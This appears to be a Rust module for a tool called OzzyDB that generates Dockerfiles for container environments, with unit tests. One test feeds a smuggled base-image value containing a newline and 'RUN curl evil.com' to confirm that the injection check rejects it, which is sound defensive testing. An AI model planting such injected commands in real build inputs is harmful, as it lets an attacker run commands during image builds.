//! Environment building — Docker image construction from environment definitions.
//!
//! Environments define the container image that transform code runs in.
//! Three tiers:
//! - **BaseLockfile**: OzzyDB base image + user lockfile → auto-generated Dockerfile
//! - **Dockerfile**: User-provided Dockerfile (fetched from git)
//! - **Prebuilt**: Pre-existing image reference (no build needed)

pub mod docker;
pub mod hash;

use ozzy_core::toml_spec::EnvironmentTier;

/// Result of building (or resolving) an environment image.
#[derive(Debug, Clone)]
pub struct BuiltEnvironment {
    /// The environment hash (content-addressed key).
    pub env_hash: String,
    /// The Docker image reference (e.g., "ozzydb-env:abc123" or "user/image:tag").
    pub image_ref: String,
    /// The build type: "base_lockfile", "dockerfile", or "prebuilt".
    pub build_type: String,
    /// Base image used (for base_lockfile tier only).
    pub base_image: Option<String>,
    /// Build duration in milliseconds (None if prebuilt or already cached).
    pub build_duration_ms: Option<i32>,
    /// Build log content (for filing to storage).
    pub build_log: Option<String>,
}

/// Classify an environment tier into its build_type string.
pub fn build_type_str(tier: &EnvironmentTier) -> &'static str {
    match tier {
        EnvironmentTier::BaseLockfile { .. } => "base_lockfile",
        EnvironmentTier::Dockerfile { .. } => "dockerfile",
        EnvironmentTier::Prebuilt { .. } => "prebuilt",
    }
}

/// Generate a Dockerfile for a BaseLockfile environment.
///
/// Detects lockfile type from the filename and uses the appropriate installer:
/// - `requirements.txt` → `pip install`
/// - Other pip-compatible → `pip install -r` (best-effort fallback)
/// - `uv.lock` → rejected (needs export to requirements.txt)
/// - `poetry.lock` → rejected (needs pyproject.toml + export to requirements.txt)
pub fn generate_dockerfile(base_image: &str, lockfile_name: &str) -> Result<String, &'static str> {
    // Validate base_image: reject newlines and other Dockerfile injection vectors
    if base_image.contains('\n') || base_image.contains('\r') {
        return Err("base_image must not contain newlines");
    }

    let install_cmd = if lockfile_name == "uv.lock" || lockfile_name.ends_with("/uv.lock") {
        // uv.lock is a TOML-based lockfile that is not pip-installable.
        // Use `uv export > requirements.txt` and reference that instead.
        return Err("uv.lock is not directly installable. Export it to requirements.txt with `uv export --no-hashes > requirements.txt` and set lockfile = \"requirements.txt\" in ozzy.toml");
    } else if lockfile_name == "poetry.lock" || lockfile_name.ends_with("/poetry.lock") {
        // poetry.lock requires pyproject.toml for installation, which the BaseLockfile
        // tier doesn't support (single file only). Export to requirements.txt instead.
        return Err("poetry.lock is not directly installable without pyproject.toml. Export it to requirements.txt with `poetry export -f requirements.txt -o requirements.txt` and set lockfile = \"requirements.txt\" in ozzy.toml");
    } else {
        // requirements.txt or any pip-compatible lockfile
        "RUN pip install --no-cache-dir -r /tmp/lockfile"
    };

    Ok(format!(
        "FROM {base_image}\n\
         COPY lockfile /tmp/lockfile\n\
         {install_cmd}\n"
    ))
}

/// Generate a Dockerfile for Tier 2 (user-provided Dockerfile content).
///
/// The content is used as-is — it's the user's full Dockerfile.
pub fn dockerfile_from_content(dockerfile_content: &str) -> String {
    dockerfile_content.to_string()
}

/// The image tag pattern for OzzyDB-built environments.
pub fn image_tag(env_hash: &str) -> String {
    format!("ozzydb-env:{}", env_hash)
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- generate_dockerfile --

    #[test]
    fn test_dockerfile_requirements_txt() {
        let df = generate_dockerfile("python:3.12-slim", "requirements.txt").unwrap();
        assert!(df.starts_with("FROM python:3.12-slim\n"));
        assert!(df.contains("pip install --no-cache-dir -r /tmp/lockfile"));
        assert!(df.contains("COPY lockfile /tmp/lockfile"));
    }

    #[test]
    fn test_dockerfile_rejects_poetry_lock() {
        let result = generate_dockerfile("python:3.12", "poetry.lock");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("poetry.lock is not directly installable"));
    }

    #[test]
    fn test_dockerfile_unknown_lockfile_falls_back_to_pip() {
        let df = generate_dockerfile("python:3.12", "Pipfile.lock").unwrap();
        assert!(df.contains("pip install --no-cache-dir -r /tmp/lockfile"));
    }

    #[test]
    fn test_dockerfile_rejects_newline_in_base_image() {
        let result = generate_dockerfile("python:3.12\nRUN curl evil.com", "requirements.txt");
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), "base_image must not contain newlines");
    }

    // -- image_tag --

    #[test]
    fn test_image_tag() {
        assert_eq!(image_tag("abc123"), "ozzydb-env:abc123");
    }

    // -- build_type_str --

    #[test]
    fn test_build_type_str() {
        assert_eq!(
            build_type_str(&EnvironmentTier::BaseLockfile {
                base: "x".into(),
                lockfile: "y".into()
            }),
            "base_lockfile"
        );
        assert_eq!(
            build_type_str(&EnvironmentTier::Dockerfile {
                dockerfile: "x".into()
            }),
            "dockerfile"
        );
        assert_eq!(
            build_type_str(&EnvironmentTier::Prebuilt { image: "x".into() }),
            "prebuilt"
        );
    }
}
